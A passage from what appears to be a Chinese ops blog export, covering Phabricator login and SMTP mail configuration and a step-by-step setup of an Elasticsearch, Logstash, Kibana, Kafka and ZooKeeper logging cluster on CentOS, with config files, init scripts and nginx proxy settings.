/usr/share/pear/apc.php /var/www/html/apc.php (this step is optional)# /etc/init.d/httpd restart phabricator官网配置说明Configuration Guide 1. 身份验证提供者Phabricator登录的方法被称为身份验证提供者（Authentication Providers）。例如,当我们设置了一个”用户名/密码”身份验证提供者,那么用户可以通过传统的用户名和密码登录。Phabricator支持多种登录系统。当我们使用Administrators登录到后台之后，我们就可以启用或禁用这些Providers，配置用户如何注册或登录到Phabricator。 在公司内部使用，我们一般使用Username/Password或LDAP，对于开源项目，我们也可以使用类似于GitHub等OAuth第三方登录。在使用Username/Password登录方式时，我们还可以限制注册用户时的邮箱后缀，我们可以设置成公司的邮箱域名。 1.1 修改登录方式网页上可以对其进行相应的修改。具体位置在：左侧菜单Auth -&gt; Add Provider -&gt; username/password(账号密码方式登录)支持 账号密码登录以及第三方（facebook、github等）账号登录。另外，可以选择用户自主注册，或者禁用（管理员配置）。 这里选择LDAP同步需要安装PHP LDAP扩展： 123Before you can set up or use LDAP, you need to install the PHP LDAP extension. It is not currently installed, so PHP can not talk to LDAP. Usually you can install it with `yum install php-ldap`, `apt-get install php5-ldap`, or a similar package manager command.yum install php-ldap -y 注：如果第一次管理员登录以后，没有修改登录方式，接着退出。下次登录可能会被锁住，需要使用以下命令解锁。 1/bin/auth recover &lt;username&gt; 1.2 设置用户登录认证方式使用管理员账号登录，在左侧的菜单中选择 Auth ，然后点击右上侧 Add Provider，在列表中选则你需要的认证方式。 我选择是Username/Password的方式，即用户自己注册Phabricator账号。为了保障安全，我设置了只允许公司邮箱地址注册：Config ---&gt; Core Settings ---&gt; Authentication ---&gt; auth.email-domains。你还可以选择 auth.require-approval ，即新注册用户需要管理员批准。 1.3 设置邮件发送服务参数首先，配置 mail-adapter （邮件发送方式）：Config ---&gt; Core Settings ---&gt; Mail ---&gt; metamta.mail-adapter，我选择的是 PhabricatorMailImplementationPHPMailerAdapter ，通过SMTP的方式发送邮件。在选择完之后，需要设置SMTP服务器地址、账号和密码：Config —&gt; Core Settings —&gt; PHPMailer —&gt; metamta.mail-adapter，根据你自己邮箱的配置，相应的设置 phpmailer.smtp-host、phpmailer.smtp-port、phpmailer.smtp-protocol、phpmailer.smtp-user、phpmailer.smtp-password、phpmailer.smtp-encoding 。 2.邮箱关联切换到phabricator/bin/目录下运行daemon：./bin/phd start。 注意每次重启需要再次启用，因此建议放到启动脚本上。 配置mail：通过web访问phabricator并在页面上进行配置：（这里使用的是外部SMTP server的方式，更多方式参见phabricator docs） 用administrator账号登录后，在administration栏选择Config进入 1）选择mail，设置 metamta.default-address – xxxx@163.com // 注意：这里必须要用与smtp服务器对应的邮箱地址，不然邮件发不出去 metamta.domain -- phabricator.myproject.com // 随意 metamta.mail-adapter: set to &quot;PhabricatorMailImplementationPHPMailerAdapter&quot; metamta.send-immediately: Send Via Daemons （目前版本貌似没有） 2）选择PHPMailer，设置：（以163.com的SMTP server为例） phpmailer.mailer: set to “smtp”. （默认） phpmailer.smtp-host: smtp.163.com phpmailer.smtp-port: 25 （默认） phpmailer.smtp-user: xxxx phpmailer.smtp-password: xxxx 目前版本页面上不能配置PHPMailer，只能使用工具/bin/config工具set相对应的配置项。 123phabricator/ $ ./bin/mail list-outbound # List outbound mail.phabricator/ $ ./bin/mail show-outbound # Show details about messages.phabricator/ $ ./bin/mail send-test # Send test messages. 3. 参考：https://www.oschina.net/question/191440_125562 Phabricator入门手册 http://blog.csdn.net/zzllabcd/article/details/49997421 10.04Ubuntu安装 http://www.cnblogs.com/clovn/p/5103611.html debian7安装 https://secure.phabricator.com/book/phabricator/article/installation_guide/ 官方guider https://liuzhichao.com/p/1992.html Phabricator 实践之配置账号和注册 https://www.oschina.net/question/191440_125562 入门手册 http://www.jianshu.com/p/b1a75a14638c 简书中的分享（较为完整） http://www.cnblogs.com/ToDoToTry/p/3956687.html git server搭建指南 https://my.oschina.net/miger/blog/775609 linux平台arc工具的使用 http://blog.csdn.net/peapon/article/details/29881575 windows中arc的使用","raw":null,"content":null,"categories":[{"name":"automation","slug":"automation","permalink":"http://blog.yangcvo.me/categories/automation/"}],"tags":[]},{"title":"搭建(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafka为消息中心的ELK日志平台","slug":"日志分析\u0010平台/Elasticsearch/搭建(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafka为消息中心的ELK日志平台","date":"2016-12-29T09:56:03.000Z","updated":"2017-04-20T06:43:34.000Z","comments":true,"path":"2016/12/29/日志分析\u0010平台/Elasticsearch/搭建(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafka为消息中心的ELK日志平台/","link":"","permalink":"http://blog.yangcvo.me/2016/12/29/日志分析\u0010平台/Elasticsearch/搭建(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafka为消息中心的ELK日志平台/","excerpt":"","text":"搭建(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafka为消息中心的ELK日志平台介绍ELK是业界标准的日志采集,存储索引,展示分析系统解决方案 logstash提供了灵活多样的插件支持不同的input/output 主流使用redis/kafka作为日志/消息的中间环节 如果已有kafka的环境了,使用kafka比使用redis更佳 以下是一个最简化的配置做个笔记,elastic官网提供了非常丰富的文档 不要用搜索引擎去搜索,没多少结果的,请直接看官网文档 版本及连接elasticseearch版本: 2.4.3 系统要求如果仅作测试用, 不需要两天机器, 可以将两个节点部署在同一台机器上, 对磁盘/cpu要求不高, 内存大于2g基本足够了 如果是正式环境, 需要根据日志量进行评估, 例如, 每天日志量占硬盘约约10G, 且保留30天日志, 则磁盘会占用约300g, es设定的阈值是磁盘空间占满85%则日志开始告警. 所以, 需要至少 300/0.85=354g. 准备4台机器, 在同一个局域网内(可ping通), 分别在每台机器上部署相应es节点, 搭建一套日志集群. 4台机器, 最少的资源了, 但是没法做到高可用, 所以, 还需要再加一台机器, 防止脑裂, 具体见最后(两台主力机器+一台稳定的机器就行) 集群节点: 最少4台机器内存: 8G及以上cpu: 4核及以上硬盘: 800G及以上, 建议1T, 集群容量约10亿级(取决于对应日志大小)操作系统: centos 准备工作: 应用/网络 环境SLB： 阿里云做负载均衡&amp; 或者自己搭建nginx ELK服务端集群： 系统centos 6.7 JDK1.8 版本：Elasticsearch-2.4.0 es_01 10.47.88.206es_02 10.47.88.188 Kibana服务端集群： 系统centos 6.7 JDK1.8 版本：kibana-4.5.1 es_01 10.47.88.206es_02 10.47.88.188 KafKa集群 系统centos 6.7 JDK1.8 版本：kafka_2.10-0.9 kafka_01 10.46.72.172kafka_02 10.47.88.103kafka_03 10.47.102.137 zookeeper集群 系统centos 6.7 JDK1.8 版本：zookeeper-3.4.6 kafka_01 10.46.72.172kafka_02 10.47.88.103kafka_03 10.47.102.137 logstash-2.4 客户端：系统centos 6.7 JDK1.8 版本： logstash-2.4 tomcat-account_01: 10.27.232.85 都要jdk1.8支持。 整体说明数据流向=&gt;日志/消息整体流向logstash =&gt; kafka =&gt; logstash =&gt; elasticsearch =&gt; kibana 部署1. 确认JDK版本及安装es依赖java的版本最小为1.7 如果系统中未安装JDK则命令返回bash: java: command not found, 需要安装JDK 如果系统中安装了JDK, 需确认版本是否大于java 1.7, 否则需要升级 123456789101112java -versionjava version \"1.7.0_51\" Java(TM) SE Runtime Environment (build 1.7.0_51-b13) Java HotSpot(TM) Server VM (build 24.51-b03, mixed mode)安装及升级java(注意根据系统不同运行对应安装命令)# Redhat/Centos/Fedorasudo yum install java-1.7.0-openjdk或者到官网, 下载最新的jdk的rpm包, 然后安装wget http://download.oracle.com/otn-pub/java/jdk/8u91-b14/jdk-8u91-linux-x64.rpmrpm -Uvh jdk-8u91-linux-x64.rpm 再次确认安装成功 1java -version 基本配置设置FQDN：12345678910111213141516171819#修改hostnamecat /etc/hostnamees_01#修改hostscat /etc/hosts127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4::1 localhost localhost.localdomain localhost6 localhost6.localdomain610.47.88.206 es.ihaozhuo.com es_01#刷新环境hostname -F /etc/hostname#复查结果hostname -fes.ihaozhuo.comhostnamees_01 防火墙配置1234567891011#service iptables stop#setenforce 0不过这里我防火墙是开启的，后期添加出去端口即可。或者可以不关闭防火墙，但是要在iptables中打开相关的端口：# vim /etc/sysconfig/iptables-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 9200 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 9292 -j ACCEPT# service iptables restart RPM快速安装elk所有安装都可以使用rpm二进制包的方式,增加elastic官网的仓库repo就可以用yum安装了 elasticsearch看这里 —– elasticsearch-rpm官方文档 logstash看这里 —-logstash-rpm官网文档 kibana看这里 —kibana-rpm官网文档 es_01服务端源码安装这里我是源码安装的下载ElasticSearch ElasticSearch默认的对外服务的HTTP端口是9200，节点间交互的TCP端口是9300。 下载地址：Elasticsearch 2.4版本：Elasticsearch2.4.3 1234567891011121314151617181920212223242526解压源码包：[root@es_01 ~]# tar -zxvf elasticsearch-2.4.3.tar.gz -C /usr/local/然后给目录做个软链接：[root@es_01 local]# ln -s /usr/local/elasticsearch-2.4.3/ /usr/local/elasticsearch这里需要修改配置文件：配置前先创建几个目录文件新建目录, 假设/data/目录挂载的硬盘最大(500G以上)[root@es_01 srv]]# mkdir /srv/data/es-data -p[root@es_01 srv]# mkdir /srv/data/es-work [root@es_01 local]# mkdir /usr/local/elasticsearch/logs[root@es_01 local]# mkdir /usr/local/elasticsearch/config/plugins新建用户修改源码目录属性属组：[root@es_01 elasticsearch]# useradd -s /sbin/nologin elasticsearch[root@es_01 elasticsearch]# chown -R elasticsearch:elasticsearch /usr/local/elasticsearch[root@es_01 elasticsearch]# chown -R elasticsearch:elasticsearch /srv/data/切换用户切换到elasticsearch用户, 并进入elasticsearch目录su elasticsearchcd /usr/local/elasticsearch/ 配置Elasticsearch：以用户es的身份进行操作 文件路径: config/elasticsearch.yml修改该文件中配置项: (注意, 原始文件中都是被#号注释掉了, 需要去掉对应注释并修改配置值) 集群名: cluster.name, 注意: 两台机器配置一致 1cluster.name: elk_cluster 节点名: node.name, 注意: 两台机器配置不同, 一台为01, 另一台为02 123456 # 第一台机器 node.name: inner_es_node_01# 第二台机器node.name: inner_es_node_02 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[root@es_01 config]# vim elasticsearch.yml# Use a descriptive name for your cluster:##cluster.name: elk_cluster## ------------------------------------ Node ------------------------------------## Use a descriptive name for the node:#node.name: es_01## Add custom attributes to the node:## node.rack: r1## ----------------------------------- Paths ------------------------------------## Path to directory where to store the data (separate multiple locations by comma):#path.data: /srv/data/es-data## Path to log files:#path.logs: /usr/local/elasticsearch/logs## ----------------------------------- Memory -----------------------------------## Lock the memory on startup:## bootstrap.memory_lock: true## Make sure that the `ES_HEAP_SIZE` environment variable is set to about half the memory# available on the system and that the owner of the process is allowed to use this limit.## Elasticsearch performs poorly when the system is swapping the memory.## ---------------------------------- Network -----------------------------------## Set the bind address to a specific IP (IPv4 or IPv6):#network.host: 10.47.88.206 切换到elasticsearch用户启动服务。 源码安装启动需要执行 ：/usr/local/elasticsearch/bin/elasticsearch &amp;才能启动； 测试访问服务正常：1234567891011121314[elasticsearch@es_01 elasticsearch]$ curl http://10.47.88.206:9200&#123; \"name\" : \"es_01\", \"cluster_name\" : \"elk_cluster\", \"cluster_uuid\" : \"mspLZT5nTL-d124suNbBBQ\", \"version\" : &#123; \"number\" : \"2.4.3\", \"build_hash\" : \"d38a34e7b75af4e17ead16f156feffa432b22be3\", \"build_timestamp\" : \"2016-12-07T16:28:56Z\", \"build_snapshot\" : false, \"lucene_version\" : \"5.5.2\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; 下面是写开机启动脚本，不写的直接切换es用户到目录启动 -d后台启动。这里需要/etc/init.d/创建启动脚本。 1234567891011121314151617181920212223242526[root@ELK ~]# git clone https://github.com/elastic/elasticsearch-servicewrapper.gitInitialized empty Git repository in /root/elasticsearch-servicewrapper/.git/remote: Counting objects: 184, done.remote: Total 184 (delta 0), reused 0 (delta 0), pack-reused 184Receiving objects: 100% (184/184), 4.55 MiB | 511 KiB/s, done.Resolving deltas: 100% (53/53), done.[root@ELK elasticsearch-servicewrapper]# mv service/ /usr/local/elasticsearch/bin/[root@ELK elasticsearch-servicewrapper]# cd /usr/local/elasticsearch[root@ELK elasticsearch]# /usr/local/elasticsearch/bin/service/elasticsearch install 这里是安装esDetected RHEL or Fedora:Installing the Elasticsearch daemon..[root@ELK elasticsearch]# vim /etc/init.d/elasticsearch 查看安装es启动配置文件[root@ELK elasticsearch]# service elastic search start 启动es Starting Elasticsearch...Waiting for Elasticsearch......running: PID:31360 服务已启动了。启动相关服务service elasticsearch startservice elasticsearch status配置 elasticsearch 服务随系统自动启动# chkconfig --add elasticsearch测试ElasticSearch服务是否正常，预期返回200的状态码# curl -X GET http://localhost:9200 es_02服务端节点：第一步基础配置都是一样的，跟es_01节点一样。 其他只需要到es_01拷贝过来,然后创建下es用户，修改下配置。 12345678910111213141516/usr/local/elasticsearch 目录拷贝到es_02机器。这里需要修改配置文件：配置前先创建几个目录文件[root@es_01 srv]]# mkdir /srv/data/es-data -p[root@es_01 srv]# mkdir /srv/data/es-work 修改源码目录属性属组：[root@es_01 elasticsearch]# useradd -s /sbin/nologin elasticsearch[root@es_01 elasticsearch]# chown -R elasticsearch:elasticsearch /usr/local/elasticsearch/*[root@es_01 elasticsearch]# chown -R elasticsearch:elasticsearch /srv/data/修改配置文件vim elasticsearch.ymlnode.name: es_02network.host: 10.47.88.188其他不需要修改 集群节点es_02测试：1234567891011121314[root@es_02 home]# curl http://10.47.88.188:9200&#123; \"name\" : \"es_02\", \"cluster_name\" : \"elk_cluster\", \"cluster_uuid\" : \"-4Rqn4IzS1GfnsodqZD8Tg\", \"version\" : &#123; \"number\" : \"2.4.3\", \"build_hash\" : \"d38a34e7b75af4e17ead16f156feffa432b22be3\", \"build_timestamp\" : \"2016-12-07T16:28:56Z\", \"build_snapshot\" : false, \"lucene_version\" : \"5.5.2\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; elk集群已安装配置完毕，我这里配置了nginx做下反向代理，走80端口出去。然后在nginx设置下内部公司访问不对外开放。 安装 head、marvel、bigdesk插件:es1.5插件安装是./plugin -install xxx,而es2.4插件安装没有减号./plugin install xxx 1.5版本方法： 1234567891011121314* head插件插件安装方法1：/usr/local/elasticsearch/bin/plugin -install mobz/elasticsearch-head重启es 即可。打开http://localhost:9200/_plugin/head/插件安装方法2：1.https://github.com/mobz/elasticsearch-head下载zip 解压2.建立elasticsearch-1.0.0\\plugins\\head\\_site文件3.将解压后的elasticsearch-head-master文件夹下的文件copy到_site重启es 即可。打开http://localhost:9200/_plugin/head/ 2.4版本以上安装： 1234567891011121314* head插件插件安装方法1：/usr/local/elasticsearch/bin/plugin install mobz/elasticsearch-head重启es 即可。打开http://localhost:9200/_plugin/head/插件安装方法2：1.https://github.com/mobz/elasticsearch-head下载zip 解压2.建立elasticsearch-1.0.0\\plugins\\head\\_site文件3.将解压后的elasticsearch-head-master文件夹下的文件copy到_site重启es 即可。打开http://localhost:9200/_plugin/head/ 为了保障搜索服务的稳定性，增加了一台机器，将Elasticsearch部署成了集群模式， 部署到生产环境时发现，新的节点并不能被发现，后台发现阿里云并不支持多播，最后只能改为单播的方式配置了，好在之后一切顺利。 下面附上测试环境配置示例：添加下下面监听集群IP和端口。 es_01 1234[root@es_01 config]# vim elasticsearch.ymldiscovery.zen.ping.multicast.enabled: falsediscovery.zen.ping.unicast.hosts: [\"10.47.88.206:9300\",\"10.47.88.188:9300\"] es_02 1234[root@es_02 config]# vim elasticsearch.ymldiscovery.zen.ping.multicast.enabled: falsediscovery.zen.ping.unicast.hosts: [\"10.47.88.206:9300\",\"10.47.88.188:9300\"] 然后重启服务，查看集群节点。 es_02安装Kibana:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118到https://www.elastic.co/downloads/kibana 找合适的版本。wget https://download.elastic.co/kibana/kibana/kibana-4.5.1-linux-x64.tar.gz#解压＃tar zxvf kibana-4.1.2-linux-x64.tar.gz -C /usr/local ＃cd /usr/local/ &amp;&amp; mv kibana-4.1.2-linux-x64 kibana#创建kibana启动脚本服务vi /etc/rc.d/init.d/kibana#!/bin/bash### BEGIN INIT INFO# Provides: kibana# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Runs kibana daemon# Description: Runs the kibana daemon as a non-root user### END INIT INFO# Process nameNAME=kibanaDESC=\"Kibana4\"PROG=\"/etc/init.d/kibana\"# Configure location of Kibana binKIBANA_BIN=/usr/local/kibana/bin# PID InfoPID_FOLDER=/var/run/kibana/PID_FILE=/var/run/kibana/$NAME.pidLOCK_FILE=/var/lock/subsys/$NAMEPATH=/bin:/usr/bin:/sbin:/usr/sbin:$KIBANA_BINDAEMON=$KIBANA_BIN/$NAME# Configure User to run daemon processDAEMON_USER=root# Configure logging locationKIBANA_LOG=/var/log/kibana.log# Begin ScriptRETVAL=0if [ `id -u` -ne 0 ]; then echo \"You need root privileges to run this script\" exit 1fi# Function library. /etc/init.d/functions start() &#123; echo -n \"Starting $DESC : \"pid=`pidofproc -p $PID_FILE kibana` if [ -n \"$pid\" ] ; then echo \"Already running.\" exit 0 else # Start Daemonif [ ! -d \"$PID_FOLDER\" ] ; then mkdir $PID_FOLDER fidaemon --user=$DAEMON_USER --pidfile=$PID_FILE $DAEMON 1&gt;\"$KIBANA_LOG\" 2&gt;&amp;1 &amp; sleep 2 pidofproc node &gt; $PID_FILE RETVAL=$? [[ $? -eq 0 ]] &amp;&amp; success || failureecho [ $RETVAL = 0 ] &amp;&amp; touch $LOCK_FILE return $RETVAL fi&#125;reload()&#123; echo \"Reload command is not implemented for this service.\" return $RETVAL&#125;stop() &#123; echo -n \"Stopping $DESC : \" killproc -p $PID_FILE $DAEMON RETVAL=$?echo [ $RETVAL = 0 ] &amp;&amp; rm -f $PID_FILE $LOCK_FILE&#125; case \"$1\" in start) start;; stop) stop ;; status) status -p $PID_FILE $DAEMON RETVAL=$? ;; restart) stop start ;; reload)reload;; *)# Invalid Arguments, print the following message. echo \"Usage: $0 &#123;start|stop|status|restart&#125;\" &gt;&amp;2exit 2 ;;esac修改启动权限chmod +x /etc/rc.d/init.d/kibana 配置Kibana： 编辑kibana.yaml 修改端口，设置host 可以设置本地服务器IP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657vim /usr/local/kibana/config/kibana.yml# Kibana is served by a back end server. This controls which port to use.server.port: 5601# The host to bind the server to.server.host: \"10.47.88.188\"# If you are running kibana behind a proxy, and want to mount it at a path,# specify that path here. The basePath can't end in a slash.# server.basePath: \"\"# The maximum payload size in bytes on incoming server requests.# server.maxPayloadBytes: 1048576# The Elasticsearch instance to use for all your queries.elasticsearch.url: \"http://10.47.88.188:9200\"# preserve_elasticsearch_host true will send the hostname specified in `elasticsearch`. If you set it to false,# then the host you use to connect to *this* Kibana instance will be sent.elasticsearch.preserveHost: true# Kibana uses an index in Elasticsearch to store saved searches, visualizations# and dashboards. It will create a new index if it doesn't already exist.# kibana.index: \".kibana\"# The default application to load.kibana.defaultAppId: \"discover\"# If your Elasticsearch is protected with basic auth, these are the user credentials# used by the Kibana server to perform maintenance on the kibana_index at startup. Your Kibana# users will still need to authenticate with Elasticsearch (which is proxied through# the Kibana server)# elasticsearch.ssl.key: /path/to/your/client.key# If you need to provide a CA certificate for your Elasticsearch instance, put# the path of the pem file here.# elasticsearch.ssl.ca: /path/to/your/CA.pem# Set to false to have a complete disregard for the validity of the SSL# certificate.# elasticsearch.ssl.verify: true# Time in milliseconds to wait for elasticsearch to respond to pings, defaults to# request_timeout setting# elasticsearch.pingTimeout: 1500# Time in milliseconds to wait for responses from the back end or elasticsearch.# This must be &gt; 0elasticsearch.requestTimeout: 30000# Time in milliseconds for Elasticsearch to wait for responses from shards.# Set to 0 to disable.# elasticsearch.shardTimeout: 0 启动kibana服务12service kibana startservice kibana status 查看端口12345678910netstat -nltp[root@es_02 config]# netstat -nltpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 127.0.0.1:32000 0.0.0.0:* LISTEN 2517/javatcp 0 0 10.47.88.188:5601 0.0.0.0:* LISTEN 6474/nodetcp 0 0 10.47.88.188:10050 0.0.0.0:* LISTEN 305/zabbix_agentdtcp 0 0 10.47.88.188:9200 0.0.0.0:* LISTEN 5198/javatcp 0 0 10.47.88.188:9300 0.0.0.0:* LISTEN 5198/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 25265/sshd 到我Github上面下载kabana启动脚本。 es_01机器从es_02机器拷贝过去修改下配置就可以。 kibana安装插件参考：Installing Marvel 这里kibana我做了nginx反向代理，集群代理。 nginx配置kibana反向代理：这里我只允许我公司IP访问： 1234567891011121314151617181920 upstream kibana.ihaozhuo.com &#123; server 10.47.88.206:5601 weight=1; server 10.47.88.188:5601 weight=1;&#125; server &#123; listen 80; server_name kibana.ihaozhuo.com; location / &#123; index index.html index.php index.jsp index.htm; allow 202.107.202.82/32; deny all; proxy_pass http://kibana.ihaozhuo.com; proxy_ignore_client_abort on; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125;&#125; KafKa集群搭建123下载地址：http://mirrors.hust.edu.cn/apache/kafka/0.9.0.0/kafka_2.10-0.9.0.0.tgz[root@kafka_01 srv]# tar -xvf kafka_2.10-0.9.0.0.tgz[root@kafka_01 srv]# mv kafka_2.10-0.9.0.0 kafka 修改kafka配置文件：12345678910111213141516[root@kafka_01 config]# vim /srv/kafka/config/server.properties#设置brokerid（从0开始，3个节点分别设为0,1,2，不能重复）在这里id=0跟zookeeper id设置一样就行。 集群机器：按顺序写1broker.id=0 #设置data目录，最好不要用默认的/tmp/kafka-logsmkdir -p /srv/kafka/data/kafka-logs #修改本地IP地址：listeners=PLAINTEXT://10.46.72.172:9092 #设置注册地址（重要，默认会把本机的hostanme注册到zk中，客户端连接时需要解析该hostanme，所以这里直接注册本机的IP地址，避免hostname解析失败，报错java.nio.channels.UnresolvedAddressException或java.io.IOException: Can not resolve address）#设置zookeeper地址zookeeper.connect=10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181 Kafka群集新建一个Topic叫做logstash Topic 12345678910111213141516#查看tocpic列表（--zookeeper指定任意一个zk节点即可，用于获取集群信息）/usr/local/kafka/bin/kafka-topics.sh --zookeeper zk1.yazuoyw.com:2181 --describe #创建topic（--replication-factor表示复制到多少个节点，--partitions表示分区数，一般都设置为2或与节点数相等，不能大于总节点数）/usr/local/kafka/bin/kafka-topics.sh --zookeeper zk1.yazuoyw.com:2181 --create --topic topic1 --replication-factor 2 --partitions 2 #发送消息（--topic 指定topic）/usr/local/kafka/bin/kafka-console-producer.sh --broker-list kafka1.yazuoyw.com:9092,kafka2.yazuoyw.com:9092,kafka3.yazuoyw.com:9092 --topic topic1message1message2 #消费消息/usr/local/kafka/bin/kafka-console-consumer.sh --zookeeper zk1.yazuoyw.com:2181 --topic topic1#replica检查/usr/local/kafka/bin/kafka-replica-verification.sh --broker-list kafka1.yazuoyw.com:9092,kafka2.yazuoyw.com:9092,kafka3.yazuoyw.com:9092 每条发布到Kafka集群的消息都有一个类别，这个类别被称为topic。（物理上不同topic的消息分开存储，逻辑上一个topic的消息虽然保存于一个或多个broker上但用户只需指定消息的topic即可生产或消费数据而不必关心数据存于何处） ElasticSearch机器logstash把数据从kafka存到elasticsearch的配置 其中选取kafka群集任意一个有zk的ip做连接使用 topic_id就是kafka中设置的topic logstash 在es上面安装logstash配置/usr/local/logstash/config/kafka_to_es.conf 1234567891011121314151617 input &#123; kafka &#123; zk_connect =&gt; \"10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181/kafka\" group_id =&gt; \"logstash\" topic_id =&gt; \"logstash\" reset_beginning =&gt; false # boolean (optional)， default: false consumer_threads =&gt; 2 # number (optional)， default: 1 decorate_events =&gt; false # boolean (optional)， default: false &#125; &#125; output &#123; elasticsearch &#123; hosts =&gt; [\"10.47.88.206:9200\",\"10.47.88.188:9200\"] index =&gt; \"%&#123;host&#125;-%&#123;+YYYY.MM.dd&#125;\"&#125; # stdout &#123; codec =&gt; rubydebug &#125; &#125; 新建了个测试的，测试下发送是否成功：/usr/local/logstash/config/stdin_to_es.conf 123456789input &#123; stdin &#123;&#125;&#125; output &#123; elasticsearch &#123; hosts =&gt; \"10.47.88.206\"&#125; stdout &#123; codec =&gt; rubydebug &#125; &#125; Step 2: 启动服务1234567891011121314Kafka用到了Zookeeper，所有首先启动Zookper，下面简单的启用一个单实例的Zookkeeper服务。可以在命令的结尾加个&amp;符号，这样就可以启动后离开控制台。#现在启动Kafka:/srv/kafka/bin/kafka-server-start.sh -daemon config/server.properties#添加开机启动echo ‘# start kafka/usr/local/kafka/bin/kafka-server-start.sh -daemon /usr/local/kafka/config/server.properties‘ &gt;&gt; /etc/rc.local #关闭/usr/local/kafka/bin/kafka-server-stop.sh kafka配置防火墙：1-A INPUT -i eth0 -p tcp -m state --state NEW -m tcp --dport 4888 -j ACCEPT zookeeper集群查看我之前写的这篇文档 ZooKeeper的集群快速搭建与优化 走kafka查看是否所有节点都启动：1234567891011121314[root@kafka_03 bin]# sh zkCli.shConnecting to localhost:21812017-01-04 19:20:24,849 [myid:] - INFO [main:Environment@100] - Client environment:zookeeper.version=3.4.6-1569965, built on 02/20/2014 09:09 GMT2017-01-04 19:20:24,853 [myid:] - INFO [main:Environment@100] - Client environment:host.name=kafka_032017-01-04 19:20:24,853 [myid:] - INFO [main:Environment@100] - Client environment:java.version=1.8.0_662017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.vendor=Oracle Corporation2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.home=/srv/jdk1.8.0_66/jre2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.class.path=/srv/zookeeper-3.4.6/bin/../build/classes:/srv/zookeeper-3.4.6/bin/../build/lib/*.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-log4j12-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-api-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/netty-3.7.0.Final.jar:/srv/zookeeper-3.4.6/bin/../lib/log4j-1.2.16.jar:/srv/zookeeper-3.4.6/bin/../lib/jline-0.9.94.jar:/srv/zookeeper-3.4.6/bin/../zookeeper-3.4.6.jar:/srv/zookeeper-3.4.6/bin/../src/java/lib/*.jar:/srv/zookeeper-3.4.6/bin/../conf:2017-01-04 19:20:24,856 [myid:] - INFO [main:Environment@100] - Client environment:java.library.path=/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib[zk: localhost:2181(CONNECTED) 0] ls /[controller_epoch, brokers, zookeeper, kafka, dubbo, admin, isr_change_notification, consumers, config, sthp][zk: localhost:2181(CONNECTED) 5] ls /kafka/brokers/ids[0, 1, 2] kafka 三台集群这里可以看到获取到ids。 安全问题特别要注意elk所有软件的端口监听,切勿暴露监听到公网上去,另外即便是内网你也得注意配置内网的访问限制。 logstash 客户端安装：源码安装123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354我这里源码包安装# wget https://download.elasticsearch.org/logstash/logstash/logstash-2.4.0.tar.gz#curl -O https://download.elastic.co/logstash/logstash/logstash-2.4.0.tar.gz#tar -zxvf logstash-2.4.0.tar.gz#mv logstash-2.4.0 /usr/local/#ln -s /usr/local/logstash-2.4.0/ /usr/local/logstash下载启动脚本生产都是运行在后台的，我这里源码安装没有init脚本启动。 去Github下载 https://github.com/benet1006/ELK_config.git#cp logstash.init /etc/init.d/logstash#chmod +x /etc/init.d/logstash这个脚本我做过修改。#启动logstash服务service logstash startservice logstash status#查看5000端口netstat -nltpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:9200 0.0.0.0:* LISTEN 1765/javatcp 0 0 0.0.0.0:9300 0.0.0.0:* LISTEN 1765/javatcp 0 0 0.0.0.0:9301 0.0.0.0:* LISTEN 2309/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1509/sshdtcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 1876/nodetcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 2309/javatcp 0 0 :::22 :::* LISTEN 1509/sshd修改启动脚本vim /etc/init.d/logstash 指定的目录自己源码安装的路径。name=logstashpidfile=\"/var/run/$name.pid\"export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport PATH=$PATH:$JAVA_HOME/binLS_USER=logstashLS_GROUP=logstashLS_HOME=/usr/local/logstash 安装路径LS_HEAP_SIZE=\"1000m\"LS_JAVA_OPTS=\"-Djava.io.tmpdir=$&#123;LS_HOME&#125;\"LS_LOG_DIR=/usr/local/logstashLS_LOG_FILE=\"$&#123;LS_LOG_DIR&#125;/$name.log\"LS_CONF_FILE=/etc/logstash.conf 收集日志的规则confLS_OPEN_FILES=16384LS_NICE=19LS_OPTS=\"\"https://www.elastic.co/guide/en/logstash/current/plugins-inputs-file.html这个是log stash的官方文档的配置说明。这个配置说明上面我先修改下我之前的配置文件。 logstash agent配置：123456789101112131415161718192021222324252627282930313233343536配置log 